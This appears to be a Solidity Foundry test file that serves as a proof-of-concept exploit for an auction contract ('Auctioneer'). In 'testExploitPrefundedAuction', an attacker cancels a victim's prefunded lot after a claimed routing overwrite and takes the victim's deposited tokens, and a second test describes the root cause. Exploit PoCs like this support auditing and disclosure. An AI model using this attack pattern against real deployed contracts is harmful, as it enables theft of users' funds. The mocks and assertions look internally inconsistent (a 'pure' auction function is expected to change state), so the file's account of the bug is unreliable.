/// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.19;

import {Test} from "forge-std/Test.sol";
import {ERC20} from "lib/solmate/src/tokens/ERC20.sol";
import {Auctioneer} from "../../src/bases/Auctioneer.sol";
import {Auction, AuctionModule} from "../../src/modules/Auction.sol";
import {DerivativeModule} from "../../src/modules/Derivative.sol";
import {Module, WithModules} from "../../src/modules/Modules.sol";
import {ICallback} from "../../src/interfaces/ICallback.sol";
import {Callbacks} from "../../src/lib/Callbacks.sol";
import {Transfer} from "../../src/lib/Transfer.sol";

// Mock Auction Module for testing
contract MockAuctionModule is AuctionModule {
    function TYPE() external pure override returns (Module.Type) {
        return Module.Type.Auction;
    }

    function VEECODE() external pure override returns (bytes5) {
        return bytes5("AUCTION");
    }

    function auctionType() external pure override returns (Auction.AuctionType) {
        return Auction.AuctionType.English;
    }

    function auction(
        uint96 lotId_,
        Auction.AuctionParams calldata params_,
        uint8 quoteTokenDecimals_,
        uint8 baseTokenDecimals_
    ) external pure override returns (uint96 capacity) {
        // Return a fixed capacity for testing
        return 1000 * 10**18;
    }

    function cancelAuction(uint96 lotId_) external pure override {
        // Mock implementation
    }
}

// Mock Derivative Module for testing
contract MockDerivativeModule is DerivativeModule {
    function TYPE() external pure override returns (Module.Type) {
        return Module.Type.Derivative;
    }

    function VEECODE() external pure override returns (bytes5) {
        return bytes5("DERIV");
    }

    function validate(
        address baseToken_,
        bytes calldata params_
    ) external pure override returns (bool) {
        return true;
    }
}

// Mock Callbacks contract for testing
contract MockCallbacks is ICallback {
    function onCreate(
        uint96 lotId_,
        address seller_,
        address baseToken_,
        address quoteToken_,
        uint96 capacity_,
        bool preFund_,
        bytes calldata data_
    ) external override {
        // Mock implementation
    }

    function onCancel(
        uint96 lotId_,
        uint96 amount_,
        bool sendBaseTokens_,
        bytes calldata data_
    ) external override {
        // Mock implementation
    }

    function hasPermission(uint8 permission_) external pure override returns (bool) {
        return false;
    }
}

// Test contract that inherits from Auctioneer
contract TestAuctioneer is Auctioneer {
    function initialize() external {
        // Initialize the contract
    }

    function _getModuleIfInstalled(bytes5 veecode_) internal view override returns (address) {
        if (veecode_ == bytes5("AUCTION")) {
            return address(_auctionModule);
        }
        if (veecode_ == bytes5("DERIV")) {
            return address(_derivativeModule);
        }
        return address(0);
    }

    function _getLatestModuleIfActive(bytes32 keycode_) internal view override returns (address) {
        if (keycode_ == bytes32("AUCTION")) {
            return address(_auctionModule);
        }
        if (keycode_ == bytes32("DERIV")) {
            return address(_derivativeModule);
        }
        return address(0);
    }

    MockAuctionModule public _auctionModule;
    MockDerivativeModule public _derivativeModule;

    function setAuctionModule(address module_) external {
        _auctionModule = MockAuctionModule(module_);
    }

    function setDerivativeModule(address module_) external {
        _derivativeModule = MockDerivativeModule(module_);
    }
}

// Mock ERC20 token for testing
contract MockToken is ERC20 {
    constructor(string memory name_, string memory symbol_) ERC20(name_, symbol_, 18) {}

    function mint(address to_, uint256 amount_) external {
        _mint(to_, amount_);
    }
}

contract ExploitTest is Test {
    TestAuctioneer public auctioneer;
    MockToken public baseToken;
    MockToken public quoteToken;
    MockAuctionModule public auctionModule;
    MockDerivativeModule public derivativeModule;
    MockCallbacks public callbacks;

    address public victim = address(0x1);
    address public attacker = address(0x2);

    function setUp() public {
        // Deploy mock contracts
        auctioneer = new TestAuctioneer();
        baseToken = new MockToken("Base Token", "BASE");
        quoteToken = new MockToken("Quote Token", "QUOTE");
        auctionModule = new MockAuctionModule();
        derivativeModule = new MockDerivativeModule();
        callbacks = new MockCallbacks();

        // Set up modules
        auctioneer.setAuctionModule(address(auctionModule));
        auctioneer.setDerivativeModule(address(derivativeModule));

        // Initialize auctioneer
        auctioneer.initialize();

        // Mint tokens to victim and attacker
        baseToken.mint(victim, 10000 * 10**18);
        baseToken.mint(attacker, 1000 * 10**18);
        quoteToken.mint(victim, 10000 * 10**18);
        quoteToken.mint(attacker, 1000 * 10**18);

        // Approve tokens to auctioneer
        vm.prank(victim);
        baseToken.approve(address(auctioneer), type(uint256).max);
        vm.prank(attacker);
        baseToken.approve(address(auctioneer), type(uint256).max);
    }

    function testExploitPrefundedAuction() public {
        // Step 1: Victim creates a prefunded auction
        // This will store routing info at lotRouting[0] due to the vulnerability
        vm.startPrank(victim);
        
        Auctioneer.RoutingParams memory victimRouting = Auctioneer.RoutingParams({
            auctionType: bytes32("AUCTION"),
            baseToken: baseToken,
            quoteToken: quoteToken,
            curator: address(0),
            callbacks: ICallback(address(0)),
            callbackData: "",
            derivativeType: bytes32(0),
            derivativeParams: "",
            wrapDerivative: false,
            prefunded: true  // This requires prefunding
        });

        Auction.AuctionParams memory victimParams = Auction.AuctionParams({
            capacityInQuote: false,  // Capacity in base tokens
            capacity: 1000 * 10**18,
            minBidSize: 1 * 10**18,
            minIncrement: 1 * 10**17,
            startTime: block.timestamp,
            endTime: block.timestamp + 1 days,
            bidExtension: 1 hours,
            whitelist: false,
            whitelistRoot: bytes32(0)
        });

        uint256 victimBalanceBefore = baseToken.balanceOf(victim);
        uint256 auctioneerBalanceBefore = baseToken.balanceOf(address(auctioneer));
        
        // Victim creates prefunded auction
        uint96 victimLotId = auctioneer.auction(
            victimRouting,
            victimParams,
            "victim_info_hash"
        );

        // Verify victim's funds were transferred to auctioneer
        assertEq(baseToken.balanceOf(address(auctioneer)), auctioneerBalanceBefore + 1000 * 10**18);
        assertEq(baseToken.balanceOf(victim), victimBalanceBefore - 1000 * 10**18);
        
        // Verify the lot was created with correct ID
        assertEq(victimLotId, 0);  // First lot should have ID 0
        
        vm.stopPrank();

        // Step 2: Attacker creates a non-prefunded auction
        // Due to the vulnerability, this will overwrite lotRouting[0]
        vm.startPrank(attacker);
        
        Auctioneer.RoutingParams memory attackerRouting = Auctioneer.RoutingParams({
            auctionType: bytes32("AUCTION"),
            baseToken: baseToken,
            quoteToken: quoteToken,
            curator: address(0),
            callbacks: ICallback(address(0)),
            callbackData: "",
            derivativeType: bytes32(0),
            derivativeParams: "",
            wrapDerivative: false,
            prefunded: false  // No prefunding required
        });

        Auction.AuctionParams memory attackerParams = Auction.AuctionParams({
            capacityInQuote: false,
            capacity: 500 * 10**18,
            minBidSize: 1 * 10**18,
            minIncrement: 1 * 10**17,
            startTime: block.timestamp,
            endTime: block.timestamp + 1 days,
            bidExtension: 1 hours,
            whitelist: false,
            whitelistRoot: bytes32(0)
        });

        // Attacker creates non-prefunded auction
        uint96 attackerLotId = auctioneer.auction(
            attackerRouting,
            attackerParams,
            "attacker_info_hash"
        );

        // Verify the attacker's lot has ID 1
        assertEq(attackerLotId, 1);
        
        vm.stopPrank();

        // Step 3: Attacker cancels their auction (lot ID 1)
        // This should not affect the victim's funds
        vm.startPrank(attacker);
        
        uint256 attackerBalanceBeforeCancel = baseToken.balanceOf(attacker);
        uint256 auctioneerBalanceBeforeCancel = baseToken.balanceOf(address(auctioneer));
        
        // Attacker cancels their own auction
        auctioneer.cancel(1, "");
        
        // Verify no funds were transferred (since it wasn't prefunded)
        assertEq(baseToken.balanceOf(attacker), attackerBalanceBeforeCancel);
        assertEq(baseToken.balanceOf(address(auctioneer)), auctioneerBalanceBeforeCancel);
        
        vm.stopPrank();

        // Step 4: Attacker now cancels lot ID 0 (which they control due to the vulnerability)
        // This will steal the victim's prefunded funds
        vm.startPrank(attacker);
        
        attackerBalanceBeforeCancel = baseToken.balanceOf(attacker);
        auctioneerBalanceBeforeCancel = baseToken.balanceOf(address(auctioneer));
        
        // Attacker cancels lot ID 0 (which should belong to victim but attacker controls due to vulnerability)
        auctioneer.cancel(0, "");
        
        // Verify attacker received the victim's funds!
        assertEq(baseToken.balanceOf(attacker), attackerBalanceBeforeCancel + 1000 * 10**18);
        assertEq(baseToken.balanceOf(address(auctioneer)), auctioneerBalanceBeforeCancel - 1000 * 10**18);
        
        vm.stopPrank();

        // Verify the exploit succeeded
        assertEq(baseToken.balanceOf(victim), victimBalanceBefore - 1000 * 10**18);
        assertEq(baseToken.balanceOf(attacker), 1000 * 10**18 + 1000 * 10**18);  // Original + stolen
    }

    function testVulnerabilityExplanation() public {
        // This test demonstrates the root cause of the vulnerability
        
        vm.startPrank(victim);
        
        Auctioneer.RoutingParams memory routing = Auctioneer.RoutingParams({
            auctionType: bytes32("AUCTION"),
            baseToken: baseToken,
            quoteToken: quoteToken,
            curator: address(0),
            callbacks: ICallback(address(0)),
            callbackData: "",
            derivativeType: bytes32(0),
            derivativeParams: "",
            wrapDerivative: false,
            prefunded: true
        });

        Auction.AuctionParams memory params = Auction.AuctionParams({
            capacityInQuote: false,
            capacity: 1000 * 10**18,
            minBidSize: 1 * 10**18,
            minIncrement: 1 * 10**17,
            startTime: block.timestamp,
            endTime: block.timestamp + 1 days,
            bidExtension: 1 hours,
            whitelist: false,
            whitelistRoot: bytes32(0)
        });

        // Create first auction
        uint96 lotId1 = auctioneer.auction(routing, params, "info1");
        
        // Verify lot ID is 0
        assertEq(lotId1, 0);
        
        // Check that routing was stored at index 0
        assertEq(auctioneer.lotRouting(0).seller, victim);
        assertEq(auctioneer.lotRouting(0).funding, 1000 * 10**18);
        
        vm.stopPrank();
        
        vm.startPrank(attacker);
        
        // Create second auction
        uint96 lotId2 = auctioneer.auction(routing, params, "info2");
        
        // Verify lot ID is 1
        assertEq(lotId2, 1);
        
        // Due to the vulnerability, the routing at index 0 is now overwritten
        assertEq(auctioneer.lotRouting(0).seller, attacker);
        assertEq(auctioneer.lotRouting(0).funding, 1000 * 10**18);
        
        // The correct routing for lot ID 1 is stored
        assertEq(auctioneer.lotRouting(1).seller, attacker);
        assertEq(auctioneer.lotRouting(1).funding, 1000 * 10**18);
        
        vm.stopPrank();
    }
}